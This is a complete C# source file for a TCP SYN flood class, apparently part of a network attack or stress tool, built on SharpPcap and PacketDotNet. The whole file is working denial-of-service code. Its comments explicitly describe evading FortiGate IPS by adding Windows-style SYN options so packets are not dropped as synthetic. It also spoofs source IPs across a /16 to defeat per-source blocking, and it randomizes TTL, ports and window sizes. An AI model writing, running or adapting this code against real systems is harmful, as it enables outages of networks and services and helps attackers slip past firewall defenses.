using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{
    /// <summary>
    /// Unified TCP SYN flood with routing-aware behavior and FortiGate evasion.
    ///
    /// Key improvements over bare SYN floods:
    ///   - TCP SYN options (MSS + Window Scale + SACK) make packets look like real OS traffic.
    ///     FortiGate's IPS classifies bare SYN packets (no options) as synthetic attack traffic
    ///     and drops them before they reach the session table.
    ///   - Source IP spoofing distributes load across thousands of apparent clients, defeating
    ///     per-source-IP rate limiting / auto-block that FortiGate applies to a single attacker IP.
    /// </summary>
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public event EventHandler<PacketEventArgs>? PacketSent;

        /// <summary>Whether this is a routed (cross-subnet) attack.</summary>
        public bool IsRouted { get; set; } = false;

        /// <summary>No payload in routed mode (firewall-friendly), payload in local mode.</summary>
        public bool AddPayload { get; set; } = false;

        /// <summary>Randomize source port, TTL, IP ID, and source IP per packet.</summary>
        public bool RandomizeFlows { get; set; } = false;

        /// <summary>
        /// Spoof source IP addresses so FortiGate cannot block a single attacker IP.
        /// Randomizes within the /16 of the configured source IP when enabled.
        /// Requires RandomizeFlows = true to be effective.
        /// </summary>
        public bool SpoofSourceIp { get; set; } = false;

        /// <summary>
        /// Append Windows-style TCP SYN options (MSS=1460, WScale=8, SACK-OK) to every SYN.
        /// Without these, FortiGate IPS fingerprints the packets as synthetic and drops them.
        /// </summary>
        public bool AddTcpOptions { get; set; } = true;

        // Windows 10 SYN options: MSS=1460 | NOP | WScale=8 | NOP | SACK-OK | NOP (padding)
        // 12 bytes = 3 TCP option words → DataOffset = (20 + 12) / 4 = 8
        private static readonly byte[] SynOptions =
        {
            0x02, 0x04, 0x05, 0xb4,  // MSS = 1460
            0x01,                     // NOP
            0x03, 0x03, 0x08,         // Window Scale = 8 (×256)
            0x01,                     // NOP
            0x04, 0x02,               // SACK permitted
            0x00                      // End-of-options / padding to 12-byte boundary
        };

        // Realistic window sizes used by common OSes
        private static readonly ushort[] RealisticWindowSizes = { 65535, 64240, 65495, 29200, 8192, 16384 };

        public TcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        // ── Checksum helpers ──────────────────────────────────────────────────────────

        private static ushort ComputeChecksum(byte[] data, int offset, int length)
        {
            long sum = 0;
            int end = offset + length;
            int i = offset;
            while (i < end - 1) { sum += (data[i] << 8) | data[i + 1]; i += 2; }
            if (i < end) sum += data[i] << 8;
            while (sum >> 16 != 0) sum = (sum & 0xFFFF) + (sum >> 16);
            return (ushort)~sum;
        }

        private static void UpdateIpChecksum(byte[] frame, int ipOffset)
        {
            frame[ipOffset + 10] = 0;
            frame[ipOffset + 11] = 0;
            ushort cs = ComputeChecksum(frame, ipOffset, 20);
            frame[ipOffset + 10] = (byte)(cs >> 8);
            frame[ipOffset + 11] = (byte)cs;
        }

        private static void UpdateTcpChecksum(byte[] frame, int ipOffset, int tcpOffset, int tcpLength)
        {
            frame[tcpOffset + 16] = 0;
            frame[tcpOffset + 17] = 0;

            // Pseudo-header: src IP (4) + dst IP (4) + zero (1) + proto TCP (1) + TCP length (2)
            byte[] pseudo = new byte[12 + tcpLength];
            Buffer.BlockCopy(frame, ipOffset + 12, pseudo, 0, 4); // src IP
            Buffer.BlockCopy(frame, ipOffset + 16, pseudo, 4, 4); // dst IP
            pseudo[8] = 0;
            pseudo[9] = 6;
            pseudo[10] = (byte)(tcpLength >> 8);
            pseudo[11] = (byte)tcpLength;
            Buffer.BlockCopy(frame, tcpOffset, pseudo, 12, tcpLength);

            ushort cs = ComputeChecksum(pseudo, 0, pseudo.Length);
            frame[tcpOffset + 16] = (byte)(cs >> 8);
            frame[tcpOffset + 17] = (byte)cs;
        }

        /// <summary>
        /// Insert 12-byte SYN option block into a PacketDotNet-built Ethernet frame, then
        /// fix the TCP DataOffset, IP total length, IP checksum, and TCP checksum in-place.
        /// </summary>
        private static byte[] InsertSynOptions(byte[] frame)
        {
            const int etherLen = 14;
            int ipStart = etherLen;
            int ipHeaderLen = (frame[ipStart] & 0x0F) * 4; // IHL field (always 20 for our packets)
            int tcpStart = ipStart + ipHeaderLen;
            int tcpBaseEnd = tcpStart + 20; // TCP base header = 20 bytes

            int optLen = SynOptions.Length; // 12 bytes

            // Allocate new frame with options inserted between TCP base header and payload
            byte[] newFrame = new byte[frame.Length + optLen];
            Buffer.BlockCopy(frame, 0, newFrame, 0, tcpBaseEnd);
            Buffer.BlockCopy(SynOptions, 0, newFrame, tcpBaseEnd, optLen);
            if (frame.Length > tcpBaseEnd)
                Buffer.BlockCopy(frame, tcpBaseEnd, newFrame, tcpBaseEnd + optLen, frame.Length - tcpBaseEnd);

            // Update TCP DataOffset: (20 + 12) / 4 = 8 → stored in high nibble of byte 12
            newFrame[tcpStart + 12] = (byte)((8 << 4) | (newFrame[tcpStart + 12] & 0x0F));

            // Update IP Total Length
            int oldIpTotal = (newFrame[ipStart + 2] << 8) | newFrame[ipStart + 3];
            int newIpTotal = oldIpTotal + optLen;
            newFrame[ipStart + 2] = (byte)(newIpTotal >> 8);
            newFrame[ipStart + 3] = (byte)newIpTotal;

            // Recompute IP checksum and TCP checksum
            UpdateIpChecksum(newFrame, ipStart);
            int tcpSegLen = newIpTotal - ipHeaderLen;
            UpdateTcpChecksum(newFrame, ipStart, tcpStart, tcpSegLen);

            return newFrame;
        }

        // ── Main attack ───────────────────────────────────────────────────────────────

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP SYN Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr =>
                        addr.Addr.ipAddress != null &&
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                IInjectionDevice? injectionDevice = _device as IInjectionDevice;
                bool useInjection = injectionDevice != null;

                if (!useInjection && !IsRouted)
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                if (!useInjection && IsRouted)
                    Logger.Info($"Device {_device.Name} does not support injection, using standard SendPacket for routed attack");

                var random = new Random();
                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                bool useRoutedBehavior = IsRouted || RandomizeFlows;
                bool usePayload = AddPayload && !useRoutedBehavior;

                Logger.Info($"TCP Flood mode: Routed={useRoutedBehavior}, Payload={usePayload}, RandomizeFlows={RandomizeFlows}, SpoofSourceIp={SpoofSourceIp}, AddTcpOptions={AddTcpOptions}");

                var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Tcp,
                    TimeToLive = _params.Ttl
                };

                var tcpPacket = new TcpPacket(
                    (ushort)(RandomizeFlows ? random.Next(49152, 65536) : _params.SourcePort),
                    (ushort)_params.DestinationPort)
                {
                    Flags = 0x02, // SYN
                    WindowSize = (ushort)(RandomizeFlows
                        ? RealisticWindowSizes[random.Next(RealisticWindowSizes.Length)]
                        : 65535),
                    SequenceNumber = (uint)random.Next()
                };

                if (usePayload)
                {
                    tcpPacket.PayloadData = new byte[1400];
                    random.NextBytes(tcpPacket.PayloadData);
                }

                if (RandomizeFlows)
                {
                    ipPacket.Id = (ushort)random.Next(0, 65536);
                    // Realistic TTL: 64 (Linux/macOS) or 128 (Windows)
                    ipPacket.TimeToLive = (byte)(random.Next(2) == 0 ? 64 : 128);
                }

                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                // ── Calibration (routed mode only) ──────────────────────────────────

                double maxPps = 0;
                int payloadLength = 0;
                int wireHeaderSize = 0;
                int actualWireSize = 0;
                long targetBytesPerSecond = _params.BytesPerSecond;
                double userMbps = targetBytesPerSecond * 8.0 / 1_000_000;

                if (IsRouted || useRoutedBehavior)
                {
                    Logger.Info("Starting calibration for routed TCP mode...");

                    var refTcp = new TcpPacket(
                        (ushort)random.Next(49152, 65536),
                        (ushort)_params.DestinationPort)
                    {
                        Flags = 0x02,
                        WindowSize = RealisticWindowSizes[random.Next(RealisticWindowSizes.Length)],
                        SequenceNumber = (uint)random.Next()
                    };
                    var refIp = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                    {
                        Protocol = PacketDotNet.ProtocolType.Tcp,
                        TimeToLive = 64,
                        Id = (ushort)random.Next(0, 65536)
                    };
                    var refEth = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                    refIp.PayloadPacket = refTcp;
                    refEth.PayloadPacket = refIp;
                    refTcp.UpdateCalculatedValues();
                    refIp.UpdateCalculatedValues();

                    byte[] refBase = refEth.Bytes;
                    byte[] refPacket = AddTcpOptions ? InsertSynOptions(refBase) : refBase;
                    wireHeaderSize = refPacket.Length + 4;

                    var calSw = Stopwatch.StartNew();
                    long calPkts = 0;
                    const int calMs = 400;

                    Logger.Info($"Calibrating max packet rate for {calMs}ms...");
                    while (calSw.ElapsedMilliseconds < calMs && !_cancellationToken.IsCancellationRequested)
                    {
                        if (useInjection) injectionDevice!.SendPacket(refPacket);
                        else _device!.SendPacket(refPacket);
                        calPkts++;
                    }

                    calSw.Stop();
                    double calSec = calSw.ElapsedTicks / (double)Stopwatch.Frequency;
                    maxPps = calPkts / calSec;
                    Logger.Info($"Calibration: {calPkts} pkts in {calSec:F3}s = {maxPps:F0} pps");

                    long requiredWire = (long)(targetBytesPerSecond / maxPps);
                    payloadLength = (int)(requiredWire - wireHeaderSize);
                    payloadLength = Math.Max(0, Math.Min(payloadLength, 1400));

                    actualWireSize = wireHeaderSize + payloadLength;
                    double effectiveMbps = maxPps * actualWireSize * 8.0 / 1_000_000;

                    if (userMbps > effectiveMbps)
                    {
                        effectiveMbps = Math.Max(0.1, effectiveMbps);
                        targetBytesPerSecond = (long)(effectiveMbps * 1_000_000 / 8.0);
                        Logger.Warn($"Requested {userMbps:F2} Mbps exceeds capacity ({effectiveMbps:F2} Mbps). Clamping.");
                    }

                    Logger.Info($"Routed TCP: header={refPacket.Length}B, payload={payloadLength}B, wire={actualWireSize}B, maxPps={maxPps:F0}, effective={effectiveMbps:F2} Mbps");

                    if (payloadLength > 0)
                    {
                        tcpPacket.PayloadData = new byte[payloadLength];
                        random.NextBytes(tcpPacket.PayloadData);
                        tcpPacket.UpdateCalculatedValues();
                        ipPacket.UpdateCalculatedValues();
                        byte[] withPayload = ethernetPacket.Bytes;
                        actualWireSize = (AddTcpOptions ? InsertSynOptions(withPayload) : withPayload).Length + 4;
                    }
                }

                int finalPayloadLength = payloadLength;
                long finalTargetBps = targetBytesPerSecond;
                bool isRoutedMode = IsRouted || useRoutedBehavior;
                var srcIpBytes = _params.SourceIp.GetAddressBytes();

                const int batchSize = 1000;
                int batchRegen = Math.Min(100, batchSize);

                // ── Pre-generate packet pool ─────────────────────────────────────────

                int actualPacketSize = 0;
                var packetPool = new byte[batchSize][];

                void BuildPoolEntry(int idx)
                {
                    if (RandomizeFlows)
                    {
                        tcpPacket.SourcePort = (ushort)random.Next(49152, 65536);
                        tcpPacket.SequenceNumber = (uint)random.Next();
                        tcpPacket.WindowSize = RealisticWindowSizes[random.Next(RealisticWindowSizes.Length)];
                        ipPacket.Id = (ushort)random.Next(0, 65536);
                        ipPacket.TimeToLive = (byte)(random.Next(2) == 0 ? 64 : 128);

                        if (SpoofSourceIp)
                        {
                            // Randomize within the /16 of the configured source IP
                            // to look like many legitimate internal hosts
                            var spoof = (byte[])srcIpBytes.Clone();
                            spoof[2] = (byte)random.Next(0, 256);
                            spoof[3] = (byte)random.Next(1, 255);
                            ipPacket.SourceAddress = new IPAddress(spoof);
                        }
                    }
                    else
                    {
                        tcpPacket.SequenceNumber = (uint)random.Next();
                    }

                    if (isRoutedMode && finalPayloadLength > 0 && tcpPacket.PayloadData != null)
                        random.NextBytes(tcpPacket.PayloadData);

                    // UpdateCalculatedValues re-computes TCP checksum (using parent IP for pseudo-header)
                    // and IP checksum — must be called in this order.
                    tcpPacket.UpdateCalculatedValues();
                    ipPacket.UpdateCalculatedValues();

                    byte[] baseFrame = ethernetPacket.Bytes;
                    packetPool[idx] = AddTcpOptions ? InsertSynOptions(baseFrame) : baseFrame;
                }

                for (int i = 0; i < batchSize; i++)
                {
                    BuildPoolEntry(i);
                    if (i == 0) actualPacketSize = packetPool[0].Length;
                }

                int wirePacketSize = isRoutedMode
                    ? (actualWireSize > 0 ? actualWireSize : actualPacketSize + 4)
                    : (actualPacketSize + 4);

                double finalMbps = finalTargetBps * 8.0 / 1_000_000;
                Logger.Info($"TCP packet wire size: {wirePacketSize} bytes, target: {finalMbps:F2} Mbps");

                // ── Send loop ────────────────────────────────────────────────────────

                await Task.Run(() =>
                {
                    var stopwatch = new Stopwatch();
                    long bytesSent = 0;
                    int currentBatch = 0;

                    var measurementStartTime = stopwatch.ElapsedTicks;
                    long measurementStartBytes = 0;
                    const int measurementWindowMs = 500;
                    double smoothedActualMbps = 0;
                    const double smoothingAlpha = 0.3;

                    bool isLowRate = finalMbps < 5.0;
                    int sleepCounter = 0;

                    stopwatch.Start();

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                            long allowedBytes = (long)(elapsedSeconds * finalTargetBps);

                            if (bytesSent < allowedBytes)
                            {
                                long bytesBehind = allowedBytes - bytesSent;
                                int packetsToSend = Math.Min((int)(bytesBehind / wirePacketSize) + 1, 5);

                                for (int i = 0; i < packetsToSend && bytesSent < allowedBytes; i++)
                                {
                                    var packet = packetPool[currentBatch];
                                    if (useInjection) injectionDevice!.SendPacket(packet);
                                    else _device!.SendPacket(packet);

                                    OnPacketSent(packet, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);
                                    bytesSent += wirePacketSize;
                                    currentBatch++;

                                    if (currentBatch >= batchSize)
                                    {
                                        for (int j = 0; j < batchRegen; j++)
                                            BuildPoolEntry(j);
                                        currentBatch = 0;
                                    }
                                }
                            }
                            else
                            {
                                if (isLowRate && sleepCounter++ % 10 == 0)
                                    Thread.Sleep(0);
                                else
                                    Thread.SpinWait(10);
                            }

                            long currentTicks = stopwatch.ElapsedTicks;
                            double elapsedSinceMeasurement = (currentTicks - measurementStartTime) / (double)Stopwatch.Frequency;

                            if (elapsedSinceMeasurement >= measurementWindowMs / 1000.0)
                            {
                                long bytesInWindow = bytesSent - measurementStartBytes;
                                double actualMbps = (bytesInWindow * 8.0) / (elapsedSinceMeasurement * 1_000_000);

                                smoothedActualMbps = smoothedActualMbps == 0
                                    ? actualMbps
                                    : (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);

                                Logger.Info($"TCP rate: actual={smoothedActualMbps:F2} Mbps, target={finalMbps:F2} Mbps, bytesSent={bytesSent}, allowed={allowedBytes}");

                                measurementStartTime = currentTicks;
                                measurementStartBytes = bytesSent;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending TCP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "TCP SYN Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
}
